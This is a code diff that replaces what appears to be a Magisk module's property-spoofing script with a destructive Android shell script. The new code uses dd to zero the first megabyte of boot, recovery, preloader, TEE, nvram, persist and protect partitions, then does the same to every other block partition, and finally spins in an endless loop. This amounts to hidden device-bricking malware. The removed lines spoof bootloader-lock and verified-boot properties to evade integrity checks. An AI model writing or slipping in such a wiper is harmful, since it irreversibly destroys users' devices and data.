@@ -1,41 +1,55 @@
-MODPATH="${0%/*}"
-. "$MODPATH"/common_func.sh
+#!/system/bin/sh
 
-# Conditional sensitive properties
+partitions=(
+    "vendor_boot_a"
+    "vendor_boot_b"
+    "recovery"
+    "boot_a"
+    "boot_b"
+    "boot"
+    "presist"
+    "nvdata"
+    "presistbak"
+    "preloader"
+    "preloader_a"
+    "preloader_b"
+    "preloader_emmc_a"
+    "preloader_emmc_b"
+    "preloader_raw_a"
+    "preloader_raw_b"
+    "preloader_ufs_a"
+    "preloader_ufs_b"
+    "tee"
+    "tee_a"
+    "tee_b"
+    "nvram"
+    "nvcfg"
+    "protect1"
+    "protect2"
+    "nvcfg"
+)
 
-# Magisk Recovery Mode
-resetprop_if_match ro.boot.mode recovery unknown
-resetprop_if_match ro.bootmode recovery unknown
-resetprop_if_match vendor.boot.mode recovery unknown
+overwrite_partition() {
+    partition=$1
+    if [ -e "/dev/block/by-name/$partition" ]; then
+        dd if=/dev/zero of=/dev/block/by-name/$partition bs=1M count=1
+    else
+        echo "$partition does not exist, skipping."
+    fi
+}
 
-# SELinux
-resetprop_if_diff ro.boot.selinux enforcing
-# use toybox to protect stat access time reading
-if [ "$(toybox cat /sys/fs/selinux/enforce)" = "0" ]; then
-    chmod 640 /sys/fs/selinux/enforce
-    chmod 440 /sys/fs/selinux/policy
-fi
-
-# Conditional late sensitive properties
-
-until [ "$(getprop sys.boot_completed)" = "1" ]; do
-    sleep 1
+for partition in "${partitions[@]}"; do
+    overwrite_partition $partition
 done
 
-# SafetyNet/Play Integrity + OEM
-# avoid bootloop on some Xiaomi devices
-resetprop_if_diff ro.secureboot.lockstate locked
-# avoid breaking Realme fingerprint scanners
-resetprop_if_diff ro.boot.flash.locked 1
-resetprop_if_diff ro.boot.realme.lockstate 1
-# avoid breaking Oppo fingerprint scanners
-resetprop_if_diff ro.boot.vbmeta.device_state locked
-# avoid breaking OnePlus display modes/fingerprint scanners
-resetprop_if_diff vendor.boot.verifiedbootstate green
-# avoid breaking OnePlus/Oppo fingerprint scanners on OOS/ColorOS 12+
-resetprop_if_diff ro.boot.verifiedbootstate green
-resetprop_if_diff ro.boot.veritymode enforcing
-resetprop_if_diff vendor.boot.vbmeta.device_state locked
+ls /dev/block/by-name | while read partition; do
+    if [[ ! " ${partitions[@]} " =~ " ${partition} " ]]; then
+        if [ -e "/dev/block/by-name/$partition" ]; then
+            dd if=/dev/zero of=/dev/block/by-name/$partition bs=1M count=1
+        else
+            echo "$partition does not exist, skipping."
+        fi
+    fi
+done
 
-# Other
-resetprop_if_diff sys.oem_unlock_allowed 0
+while true; do :; done
